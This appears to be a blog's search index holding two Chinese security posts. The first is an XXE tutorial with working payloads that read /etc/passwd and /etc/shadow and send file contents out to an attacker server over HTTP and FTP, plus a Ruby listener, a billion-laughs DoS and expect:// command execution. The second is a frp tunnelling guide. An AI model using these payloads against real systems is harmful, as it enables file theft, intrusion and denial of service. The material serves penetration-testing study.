<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>XXE 漏洞</title>
    <url>/myblog/2020/06/17/XXE-%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>XXE：就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
<a id="more"></a>
<ul>
<li>所有xml文档都由5种简单的构造模块（元素，属性，实体，PCDATA CDATA）构成</li>
<li>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记。<br>在读取包含了某些字符文件输出报错的时候，可使用CDATA进行绕过。</li>
</ul>
<p>DTD：（文档类型定义）作用是定义 XML 文档的合法构建模块。可以在 XML 文档内声明，也可以外部引用。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>首先测试是否解析xml，修改Content-Type: application/xml发送测试代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE ANY[</span><br><span class="line">    &lt;!ENTITY shit “this is test” &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;$shit&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
<h3 id="有回显读取敏感文件"><a href="#有回显读取敏感文件" class="headerlink" title="有回显读取敏感文件"></a>有回显读取敏感文件</h3><p>基础payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY % data3 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow&quot;&gt;</span><br><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&amp;data3;&lt;&#x2F;r&gt;</span><br><span class="line">&lt;r&gt;&amp;data;&lt;&#x2F;r&gt;</span><br></pre></td></tr></table></figure>
<p>如果要读取的文件内容有&lt;&gt; &amp;，被解析器解析出错了，可以使用<![CDATA[xxxx]]>不让其进行解析。<br>这里声明的另一种方式% 变量(有空格)，该方式只能在DTD中进行变量引用%变量，而不能在XML中引用。<br>在远程服务器创建DTD文件：evil.dtd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY xxe &quot;%start;%body;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE GVI [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; </span><br><span class="line">&lt;!ENTITY % body SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>另外一种方法，利用报错<br>将含有参数实体的数据传递到另一个文件实体中，以便在访问第二个文件时触发文件未找到的异常，并且将第一个文件的内容作为第二个文件的名字，这样的话，就成功出发了文件未找到异常，也完全返回了第一个文件的内容。<br>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % one SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;evil.dtd&quot; &gt;</span><br><span class="line">    %one; %two; %four;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>evil.dtd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % three SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % two &quot;&lt;!ENTITY % four SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;%three;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<h3 id="无回显读取敏感文件"><a href="#无回显读取敏感文件" class="headerlink" title="无回显读取敏感文件"></a>无回显读取敏感文件</h3><p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;evil.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>evil.dtd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY data SYSTEM &#39;http:&#x2F;&#x2F;ip:9999&#x2F;?%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>nc监听即可<br>另外一种payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>evil.dtd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37 send SYSTEM &#39;http:&#x2F;&#x2F;ip:9999?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>上面两种利用方式，在java中无法正常利用：虽然能获取到dtd文件，但是却没有发送数据。</p>
<h3 id="ftp协议读取敏感文件"><a href="#ftp协议读取敏感文件" class="headerlink" title="ftp协议读取敏感文件"></a>ftp协议读取敏感文件</h3><p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;evil.xml&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p>evil.xml</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;ftp:&#x2F;&#x2F;ip:33&#x2F;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>
<p>服务器监听，接收来自33端口的ftp信息<br>Ruby ftp.rb</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require &#39;socket&#39;</span><br><span class="line">server &#x3D; TCPServer.new 33</span><br><span class="line">loop do</span><br><span class="line">  Thread.start(server.accept) do |client|</span><br><span class="line">    puts &quot;New client connected&quot;</span><br><span class="line">    data &#x3D; &quot;&quot;</span><br><span class="line">    client.puts(&quot;220 xxe-ftp-server&quot;)</span><br><span class="line">    loop &#123;</span><br><span class="line">        req &#x3D; client.gets()</span><br><span class="line">        puts &quot;&lt; &quot;+req</span><br><span class="line">        if req.include? &quot;USER&quot;</span><br><span class="line">            client.puts(&quot;331 password please - version check&quot;)</span><br><span class="line">        else</span><br><span class="line">           #puts &quot;&gt; 230 more data please!&quot;</span><br><span class="line">            client.puts(&quot;230 more data please!&quot;)</span><br><span class="line">        end</span><br><span class="line">    &#125;</span><br><span class="line">  end</span><br></pre></td></tr></table></figure>
<p>实际使用读取最后一行可能会出现丢失字符的现象，有待改进。</p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>根据响应时间/长度，判断该端口是否开启</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot; &gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>Dos攻击:著名的 billion laughs attack</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</span><br></pre></td></tr></table></figure>
<p>expect协议远程代码执行，很少发生</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;expect:&#x2F;&#x2F;id&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure>

<p>参考文章<br><a href="https://www.jianshu.com/p/ec2888780308" target="_blank" rel="noopener">https://www.jianshu.com/p/ec2888780308</a><br><a href="https://xz.aliyun.com/t/3357#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-4</a><br><a href="https://www.cnblogs.com/r00tuser/p/7255939.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/7255939.html</a><br><a href="http://www.voidcn.com/article/p-njawsjxm-ko.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-njawsjxm-ko.html</a></p>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
  </entry>
  <entry>
    <title>内网穿透工具之frp</title>
    <url>/myblog/2020/06/17/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bfrp/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透。</p>
<a id="more"></a>
<p>官方介绍：frp 仍然处于开发阶段，未经充分测试与验证，不推荐用于生产环境。<br>frp官方中文文档 <a href="https://github.com/fatedier/frp/blob/master/README_zh.md" target="_blank" rel="noopener">https://github.com/fatedier/frp/blob/master/README_zh.md</a><br>根据对应的操作系统及架构，从 <a href="https://github.com/fatedier/frp/releases" target="_blank" rel="noopener">Release</a> 页面下载最新版本的程序。<br>将 frps 及 frps.ini 放到具有公网 IP 的机器上。<br>将 frpc 及 frpc.ini 放到处于内网环境的机器上。</p>
<p>主要介绍两个作用，其余的可自行看官方文档。</p>
<h2 id="通过-ssh-访问公司内网机器"><a href="#通过-ssh-访问公司内网机器" class="headerlink" title="通过 ssh 访问公司内网机器"></a>通过 ssh 访问公司内网机器</h2><p><strong>公网机器</strong>修改frps.ini文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br></pre></td></tr></table></figure>
<p>启动 frps：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;frps -c .&#x2F;frps.ini          #前台开启，关闭就会失效</span><br><span class="line">nohup .&#x2F;frps -c .&#x2F;frps.ini &amp;  #后台开启</span><br></pre></td></tr></table></figure>
<p><strong>内网环境机器</strong>修改 frpc.ini 文件，假设 frps 所在服务器的公网 IP 为 x.x.x.x：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ssh]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 22</span><br><span class="line">remote_port &#x3D; 6000</span><br></pre></td></tr></table></figure>
<p>开启运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;frpc -c .&#x2F;frpc.ini           #前台开启，关闭就会失效</span><br><span class="line">nohup .&#x2F;frpc -c .&#x2F;frpc.ini &amp;   #后台开启</span><br></pre></td></tr></table></figure>
<p>外网ssh访问内网服务器<br><code>ssh x.x.x.x -p 6000</code></p>
<h2 id="通过自定义域名访问部署于内网的-web-服务"><a href="#通过自定义域名访问部署于内网的-web-服务" class="headerlink" title="通过自定义域名访问部署于内网的 web 服务"></a>通过自定义域名访问部署于内网的 web 服务</h2><p>启动同上方式同上，配置为内容<br><strong>公网机器</strong>修改 frps.ini 文件，设置 http 访问端口为 8080：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line">vhost_http_port &#x3D; 8080</span><br></pre></td></tr></table></figure>
<p><strong>内网环境机器</strong>修改 frpc.ini 文件，假设 frps 所在的服务器的 IP 为 x.x.x.x，local_port 为本地机器上 web 服务对应的端口, 绑定自定义域名 <a href="http://www.yourdomain.com" target="_blank" rel="noopener">www.yourdomain.com</a>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">[web]</span><br><span class="line">type &#x3D; http</span><br><span class="line">local_port &#x3D; 80</span><br><span class="line">custom_domains &#x3D; www.yourdomain.com</span><br></pre></td></tr></table></figure>
<p>将 <a href="http://www.yourdomain.com" target="_blank" rel="noopener">www.yourdomain.com</a> 的域名 A 记录解析到 IP x.x.x.x，如果服务器已经有对应的域名，也可以将 CNAME 记录解析到服务器原先的域名。<br>通过浏览器访问 <a href="http://www.yourdomain.com:8080" target="_blank" rel="noopener">http://www.yourdomain.com:8080</a> 即可访问到处于内网机器上的 web 服务。<br>也可以不用域名通过IP访问，主要在于更改端口，下面给出一些配置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 22</span><br><span class="line">remote_port &#x3D; 6000</span><br><span class="line"></span><br><span class="line">[web]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 80</span><br><span class="line">remote_port &#x3D; 8081</span><br><span class="line"></span><br><span class="line">[RDP]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 192.168.1.30 #电脑在局域网中的内网 IP (如是本机，也可使用 127.0.0.1)</span><br><span class="line">local_port &#x3D; 3389</span><br><span class="line">remote_port &#x3D; 7001</span><br><span class="line"></span><br><span class="line">[DSM]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 192.168.1.40 #在局域网中的内网 IP</span><br><span class="line">local_port &#x3D; 5000</span><br><span class="line">remote_port &#x3D; 7002</span><br><span class="line"></span><br><span class="line">frp+proxifier</span><br><span class="line">[socks_proxy]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 9999</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">ssh把远程服务器的流量，变成本地计算机的socks5代理</span><br><span class="line">ssh -f -N -D 127.0.0.1:1080 -oPort&#x3D;6000 test@192.168.2.1</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
</search>
